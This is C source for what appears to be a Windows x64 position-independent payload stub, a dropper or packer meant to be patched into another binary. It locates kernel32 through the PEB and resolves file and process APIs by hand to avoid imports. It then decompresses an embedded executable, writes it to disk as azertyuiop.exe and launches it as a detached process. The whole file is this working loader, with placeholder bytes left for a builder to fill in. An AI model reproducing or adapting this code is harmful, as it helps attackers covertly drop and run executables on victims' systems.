#include <stddef.h>
#include <stdint.h>

#include <windows.h>
#include <winternl.h>

#define __cache_aligned(name) __attribute__((aligned(64))) name

#define POLAR_SYMBOLS   512 /* should be even */
#define POLAR_MAXLEN    15  /* should be less than 16, so we can pack two length values into a byte */

#define M_round_down(x)     while((x)&(-(x)^(x))) { (x) &= (-(x)^(x)); }
#define M_round_up(x)       while((x)&(-(x)^(x))) { (x) &= (-(x)^(x)); } (x) <<= 1;
#define M_int_swap(x, y)    {int (_)=(x); (x)=(y); (y)=(_);}

#define BLOCK_SIZE_IN  16777216
#define BLOCK_SIZE_OUT 18000000

#define ROLZ_BUCKET_SIZE    65536
#define MATCH_IDX_SIZE      15  /* make element of rolz_table[] 64 Bytes */
#define MATCH_LEN_MIN       2
#define MATCH_LEN_MAX       17  /* MATCH_LEN_MAX < MATCH_LEN_MIN + (POLAR_SYMBOLS-257) / MATCH_IDX_SIZE */

static inline int rolz_decode(unsigned short* ibuf, unsigned char* obuf, int ilen);
static inline int polar_make_code_table(const int* leng_table, int* code_table);
static inline int polar_make_decode_table(const int* leng_table, const int* code_table, int* decode_table);

static inline int checkchar(unsigned short *s1, size_t len, char c);

static inline int _strcmp(const char *s1, const char *s2);
static inline void *_memcpy(void *dst, const void *src, size_t len);
static inline void *_memset(void *dst, int c, size_t len);

#define M_rolz_item(x, n) rolz_table[(x)].m_item[mod15_table[rolz_table[(x)].m_head + (n)]]

extern uint8_t exe[];

void payload_start(void) {
    asm ("call decompress_and_launch_payload");
    asm (".byte 0xe8,0x26,0x26,0x26,0x26");
}

__attribute__((section(".text")))
static unsigned short lastword = 0;

__attribute__((section(".text")))
static unsigned short context = 0;

/* last-char table */
__attribute__((section(".text")))
static unsigned char *lastchar; //[65536];

/* rolz table */
typedef struct {
    unsigned int m_item[MATCH_IDX_SIZE];
    unsigned int m_head;
}   rolz_table_t;

__attribute__((section(".text")))
static rolz_table_t *rolz_table;

//__attribute__((section(".text")))
//static struct {
//    unsigned int m_item[MATCH_IDX_SIZE];
//    unsigned int m_head;
//} __cache_aligned(rolz_table)[ROLZ_BUCKET_SIZE];

__attribute__((section(".text")))
static unsigned char  *ibuf;  //[BLOCK_SIZE_IN];
__attribute__((section(".text")))
static unsigned short *rbuf;  //[BLOCK_SIZE_IN];
__attribute__((section(".text")))
static unsigned char  *obuf;  //[BLOCK_SIZE_OUT];

__attribute__((section(".text")))
static unsigned char __cache_aligned(mod15_table)[] = { /* MATCH_IDX_SIZE=15 */
    0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
    0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
};

void decompress_and_launch_payload() {
    size_t offset = 0;
    int ilen;
    int rlen;
    int olen;
    int rpos;
    int opos;
    int i;
    int *leng_table; //[POLAR_SYMBOLS];
    int *code_table; //[POLAR_SYMBOLS];
    int *decode_table; //[1 << (POLAR_MAXLEN + 1)];
    int code_buf;
    int code_len;
    size_t exe_size = 0x4545454545454545;

    PLIST_ENTRY table = &(((PPEB_LDR_DATA)(((PPEB)__readgsqword(0x60))->Ldr))->InMemoryOrderModuleList);
	uintptr_t kern32 = 0;

    // get kernel32
	while (table)
	{
		PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)table->Flink;

		table = table->Flink;
        //TODO: change le checkchar pour opti, pas besoin de ca
		if (checkchar(entry->FullDllName.Buffer, entry->FullDllName.Length, '3') && checkchar(entry->FullDllName.Buffer, entry->FullDllName.Length, '2')) {
			kern32 = (uintptr_t)entry->Reserved2[0];
			break;
		}
		if (entry->FullDllName.Buffer == NULL)
			break;
	}
    if (kern32 == 0)
        return;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(kern32 + 
                                    ((PIMAGE_NT_HEADERS64)(kern32 + 
                                    ((PIMAGE_DOS_HEADER)kern32)->e_lfanew))->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	uint32_t *names = (uint32_t *)(kern32 + exp->AddressOfNames);
	uint32_t *funcs = (uint32_t *)(kern32 + exp->AddressOfFunctions);
	size_t nb = exp->NumberOfNames;
    char createfilea_str[]    = "CreateFileA";
    char writefile_str[]      = "WriteFile";
    char virtualalloc_str[]   = "VirtualAlloc";
    char virtualfree_str[]    = "VirtualFree";
    char closehandle_str[]    = "CloseHandle";
    char createprocessa_str[] = "CreateProcessA";

	uintptr_t createfilea    = 0;
	uintptr_t writefile      = 0;
    uintptr_t virtualalloc   = 0;
    uintptr_t virtualfree    = 0;
    uintptr_t closehandle    = 0;
    uintptr_t createprocessa = 0;

	for (size_t j = 0; j < nb; j++) {
		if (_strcmp((const char *)(kern32 + names[j]), createfilea_str) == 0)
			createfilea = kern32 + funcs[j];
		else if (_strcmp((const char *)(kern32 + names[j]), writefile_str) == 0)
			writefile = kern32 + funcs[j];
        else if (_strcmp((const char *)(kern32 + names[j]), virtualalloc_str) == 0)
			virtualalloc = kern32 + funcs[j];
        else if (_strcmp((const char *)(kern32 + names[j]), virtualfree_str) == 0)
			virtualfree = kern32 + funcs[j];
        else if (_strcmp((const char *)(kern32 + names[j]), closehandle_str) == 0)
			closehandle = kern32 + funcs[j];
        else if (_strcmp((const char *)(kern32 + names[j]), createprocessa_str) == 0)
			createprocessa = kern32 + funcs[j];
	}

    if (createfilea == 0 || writefile == 0 || virtualalloc == 0 || virtualfree == 0 || createprocessa == 0)
        return;

    HANDLE (*myCreateFileA)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE) 
                            = (HANDLE (*)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE))createfilea;
    BOOL (*myWriteFile)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED) 
                            = (BOOL (*)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED))writefile;
    LPVOID (*myVirtualAlloc)(LPVOID,SIZE_T,DWORD,DWORD) 
                            = (LPVOID (*)(LPVOID,SIZE_T,DWORD,DWORD))virtualalloc;
    BOOL (*myVirtualFree)(LPVOID,SIZE_T,DWORD) 
                            = (BOOL (*)(LPVOID,SIZE_T,DWORD))virtualfree;
    BOOL (*myCloseHandle)(HANDLE) 
                            = (BOOL (*)(HANDLE))closehandle;
    BOOL (*myCreateProcessA)(LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION)
                            = (BOOL (*)(LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION))createprocessa;

    ibuf = myVirtualAlloc(NULL, BLOCK_SIZE_IN, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    rbuf = myVirtualAlloc(NULL, BLOCK_SIZE_IN, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    obuf = myVirtualAlloc(NULL, BLOCK_SIZE_OUT, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    lastchar = myVirtualAlloc(NULL, 65536, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    leng_table = myVirtualAlloc(NULL, POLAR_SYMBOLS*sizeof(*leng_table), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    code_table = myVirtualAlloc(NULL, POLAR_SYMBOLS*sizeof(*code_table), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    decode_table = myVirtualAlloc(NULL, (1 << (POLAR_MAXLEN + 1))*sizeof(*decode_table), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    rolz_table = myVirtualAlloc(NULL, ROLZ_BUCKET_SIZE*sizeof(*rolz_table), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);

    char filename[] = "azertyuiop.exe";

    HANDLE fp = myCreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD dummy;

    // TODO: gerer free si un malloc foire
    if (fp == NULL || ibuf == NULL || rbuf == NULL || obuf == NULL || lastchar == NULL 
       || leng_table == NULL || code_table == NULL || decode_table == NULL || rolz_table == NULL)
        return;

    while (offset < exe_size) {
        rlen = *((int *)&exe[offset]);
        offset += sizeof(rlen);
        olen = *((int *)&exe[offset]);
        offset += sizeof(olen);
        _memcpy(obuf, &exe[offset], olen);
        offset += olen;
        rpos = 0;
        opos = 0;
        code_buf = 0;
        code_len = 0;

        /* read length table */
        for(i = 0; i < POLAR_SYMBOLS; i += 2) {
            leng_table[i] =     obuf[opos] / 16;
            leng_table[i + 1] = obuf[opos] % 16;
            opos++;
        }

        /* decode */
        polar_make_code_table(leng_table, code_table);
        polar_make_decode_table(leng_table, code_table, decode_table);

        while(rpos < rlen) {
            while(opos < olen && code_len < POLAR_MAXLEN) {
                code_buf += obuf[opos++] << code_len;
                code_len += 8;
            }
            i = decode_table[code_buf % 65536];

            rbuf[rpos++] = i;
            code_buf >>= leng_table[i];
            code_len -=  leng_table[i];
        }

        ilen = rolz_decode(rbuf, ibuf, rlen);
        myWriteFile(fp, ibuf, ilen, &dummy, NULL);
    }

    myCloseHandle(fp);
    myVirtualFree(ibuf, BLOCK_SIZE_IN, MEM_RELEASE);
    myVirtualFree(rbuf, BLOCK_SIZE_IN, MEM_RELEASE);
    myVirtualFree(obuf, BLOCK_SIZE_OUT, MEM_RELEASE);
    myVirtualFree(lastchar, 65536, MEM_RELEASE);
    myVirtualFree(leng_table, POLAR_SYMBOLS*sizeof(*leng_table), MEM_RELEASE);
    myVirtualFree(code_table, POLAR_SYMBOLS*sizeof(*code_table), MEM_RELEASE);
    myVirtualFree(decode_table, (1 << (POLAR_MAXLEN + 1))*sizeof(*decode_table), MEM_RELEASE);
    myVirtualFree(rolz_table, ROLZ_BUCKET_SIZE*sizeof(*rolz_table), MEM_RELEASE);

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    _memset(&pi, 0, sizeof(pi));
    _memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);

    myCreateProcessA(filename, NULL, NULL, NULL, 0, DETACHED_PROCESS | NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
}

__attribute__((section(".text")))
uint8_t exe[] = {0x88,0x88,0x88,0x88,0x88,0x88,0x88,0x88};

void payload_end(void) {}


__attribute__((always_inline))
static inline void *_memcpy(void *dst, const void *src, size_t len) {
    for (size_t i = 0; i < len; i++)
        ((unsigned char *)dst)[i] = ((unsigned char *)src)[i];
    return dst;
}

__attribute__((always_inline))
static inline void *_memset(void *dst, int c, size_t len) {
    for (size_t i = 0; i < len; i++)
        ((unsigned char *)dst)[i] = (unsigned char)c;
    return dst;
}

__attribute__((always_inline))
static inline int _strcmp(const char *s1, const char *s2) {
    size_t i = 0;
    for (i = 0; s1[i] && s2[i]; i++) {
        if (s1[i] != s2[i])
            return s1[i] - s2[i];
    }
    return s1[i] - s2[i];
}

__attribute__((always_inline))
static inline int polar_make_code_table(const int* leng_table, int* code_table) {
    int i;
    int s;
    int t1;
    int t2;
    int code = 0;

    _memset(code_table, 0, POLAR_SYMBOLS * sizeof(int));

    /* make code for each symbol */
    for(s = 1; s <= POLAR_MAXLEN; s++) {
        for(i = 0; i < POLAR_SYMBOLS; i++) {
            if(leng_table[i] == s) {
                code_table[i] = code;
                code += 1;
            }
        }
        code *= 2;
    }

    /* reverse each code */
    for(i = 0; i < POLAR_SYMBOLS; i++) {
        t1 = 0;
        t2 = leng_table[i] - 1;
        while(t1 < t2) {
            code_table[i] ^= (1 & (code_table[i] >> t1)) << t2;
            code_table[i] ^= (1 & (code_table[i] >> t2)) << t1;
            code_table[i] ^= (1 & (code_table[i] >> t1)) << t2;
            t1++;
            t2--;
        }
    }
    return 0;
}

__attribute__((always_inline))
static inline int polar_make_decode_table(const int* leng_table, const int* code_table, int* decode_table) {
    int i;
    int c;

    for(c = 0; c < POLAR_SYMBOLS; c++) {
        if(leng_table[c] > 0) {
            for(i = 0; i + code_table[c] < 65536; i += (1 << leng_table[c])) {
                decode_table[i + code_table[c]] = c;
            }
        }
    }
    return 0;
}

__attribute__((always_inline))
static inline void rolz_update_context(unsigned char* buf, int pos, int cache) {
    int new_head;

    /* update rolz table */
    new_head = mod15_table[rolz_table[context].m_head + MATCH_IDX_SIZE - 1];
    rolz_table[context].m_head = new_head;
    rolz_table[context].m_item[new_head] = cache ?
        pos | (buf[pos] << 24) :
        pos;

    /* update last-char table */
    lastchar[lastword] = buf[pos];

    /* update context */
    context = lastword * 13131 + buf[pos];
    lastword <<= 8;
    lastword |= buf[pos];
    return;
}

__attribute__((always_inline))
static inline int rolz_decode(unsigned short* ibuf, unsigned char* obuf, int ilen) {
    int olen = 0;
    int pos = 0;
    int match_idx;
    int match_len;
    int match_offset;

    for(pos = 0; pos < ilen; pos++) {
        if(ibuf[pos] == 511) { /* last-char match */
            obuf[olen] = lastchar[lastword];
            rolz_update_context(obuf, olen++, 0);

        } else if(ibuf[pos] < 256) { /* process a literal byte */
            obuf[olen] = ibuf[pos];
            rolz_update_context(obuf, olen++, 0);

        } else { /* process a match */
            match_idx = (ibuf[pos] - 256) % MATCH_IDX_SIZE;
            match_len = (ibuf[pos] - 256) / MATCH_IDX_SIZE + MATCH_LEN_MIN;
            match_offset = olen - M_rolz_item(context, match_idx);

            while((match_len--) > 0) {
                obuf[olen] = obuf[olen - match_offset];
                rolz_update_context(obuf, olen++, 0);
            }
        }
    }
    return olen;
}

__attribute__((always_inline))
static inline int checkchar(unsigned short *s1, size_t len, char c) {
	for (size_t i = 0; i < len; i++) {
		if ((char)s1[i] == c)
			return 1;
	}
	return 0;
}
